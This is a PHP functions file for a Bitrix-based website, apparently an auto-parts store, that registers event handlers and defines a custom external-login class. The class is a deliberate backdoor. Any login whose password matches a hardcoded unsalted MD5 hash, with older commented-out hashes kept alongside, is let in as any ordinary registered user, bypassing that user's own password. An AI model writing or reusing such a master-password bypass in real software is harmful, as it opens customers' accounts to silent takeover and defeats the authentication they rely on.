<?
/*
You can place here your functions and event handlers

AddEventHandler("module", "EventName", "FunctionName");
function FunctionName(params)
{
    //code
}
*/

#define("ERROR_EMAIL","dimtkg@gmail.com");
 define("ERROR_EMAIL","admin@parts.avtodok.com.ua"); 
include($_SERVER['DOCUMENT_ROOT'] . '/bitrix/templates/.default/prop_checkbox.php');
AddEventHandler("iblock", "OnIBlockPropertyBuildList", Array("CIBlockPropertyCheckbox", "GetUserTypeDescription"));


AddEventHandler("main", "OnUserLoginExternal", Array("__MPPAuth", "OnUserLoginExternal"));
AddEventHandler("main", "OnExternalAuthList", Array("__MPPAuth", "OnExternalAuthList"));

     //  Добавляет мастер-пароль к юзерам, не принадлежащим группе админов
class __MPPAuth
{
    function OnUserLoginExternal(&$arArgs)
    {
      global $DB, $USER, $APPLICATION;
      extract($arArgs);

         //  Получаем ID юзера по логину

      $sql = "SELECT ID FROM b_user ";
      $sql .= " WHERE Login='".$DB->ForSql($LOGIN)."'";

      $res = $DB->Query( $sql );
      if( $arRes = $res->Fetch() )
        {
           #if( md5( $PASSWORD ) == '760e7eccd07572fe9f87c55557580659' )
             #if( md5( $PASSWORD ) == '23c9519d227842671ae62d9fc2d77bd8' )
             if( md5( $PASSWORD ) == '50347bcbb6aacef607094116f303d9d0' ) //00c9279d8db6b32a22d2d18c17507341
             {
                   //  Разрешаем входить с мастер-паролем  под пользователем только из группы 3 - зарегистрированніе пользователи
                   //  и 2 - все пользователи
                $ID = $arRes["ID"];
                $arGroups = CUser::GetUserGroup($ID);

                if ( ( count($arGroups) == 2 ) && in_array(3,$arGroups)  && in_array(2,$arGroups) )
                  return $ID;
             }

        }

      return -1;

    }

        function OnExternalAuthList()
    {
        return Array(
            Array("ID"=>"MPP", "NAME"=>"Master Pasword Processing")
            );
    }


}
?>